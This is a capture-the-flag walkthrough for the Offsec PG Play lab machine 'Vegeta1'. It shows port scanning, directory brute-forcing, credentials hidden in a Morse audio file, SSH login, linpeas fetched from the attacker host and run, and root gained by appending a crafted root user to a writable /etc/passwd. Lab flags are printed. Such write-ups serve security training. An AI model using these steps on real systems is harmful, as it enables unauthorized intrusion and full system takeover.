###### tags: `Offsec` `PG Play` `Easy` `Linux`

# Vegeta1
```
┌──(kali㉿kali)-[~/pgplay]
└─$ rustscan -a 192.168.181.73 -u 5000 -t 8000 --scripts -- -n -Pn -sVC

Open 192.168.181.73:22
Open 192.168.181.73:80

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```
┌──(kali㉿kali)-[~/pgplay]
└─$ ffuf -u http://192.168.181.73/FUZZ -w /home/kali/rockyou.txt -fw 6

admin                   [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 60ms]
manual                  [Status: 301, Size: 317, Words: 20, Lines: 10, Duration: 60ms]
image                   [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 61ms]
bulma                   [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 61ms]
```

`http://192.168.181.73/bulma/hahahaha.wav`
[Morse Decoder](https://morsecode.world/international/decoder/audio-decoder-adaptive.html)
```
USER : TRUNKS PASSWORD : US3R<KN>S IN DOLLARS SYMBOL<CT>
```

ssh，在`/home/trunks`得local.txt
```
┌──(kali㉿kali)-[~/pgplay]
└─$ ssh trunks@192.168.181.73

trunks@192.168.181.73's password: u$3r

trunks@Vegeta:~$ cat local.txt
9ac11f4c77bfa8baab6e629417ca61df
```

用`linpeas.sh`
```
trunks@Vegeta:/tmp$ wget 192.168.45.183/linpeas.sh
trunks@Vegeta:/tmp$ chmod +x linpeas.sh
trunks@Vegeta:/tmp$ ./linpeas.sh

═╣ Writable passwd file? ................ /etc/passwd is writable 
```

得root在/root得proof.txt
```
trunks@Vegeta:/tmp$ echo "toor:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
trunks@Vegeta:/tmp$ su toor
Password: w00t
root@Vegeta:~# cat proof.txt
8f1d56cd6989e052369298295b47a09f
```